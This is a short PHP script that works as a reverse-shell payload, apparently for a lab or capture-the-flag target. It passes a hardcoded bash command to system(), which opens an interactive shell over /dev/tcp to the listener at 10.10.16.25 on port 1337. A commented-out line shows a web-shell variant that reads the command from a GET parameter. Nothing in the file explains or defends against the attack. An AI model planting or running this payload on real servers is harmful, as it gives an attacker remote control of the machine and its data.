<?php 
//$cmd = $_GET['cmd'];
$cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.25/1337 0>&1'";

system($cmd);
?>
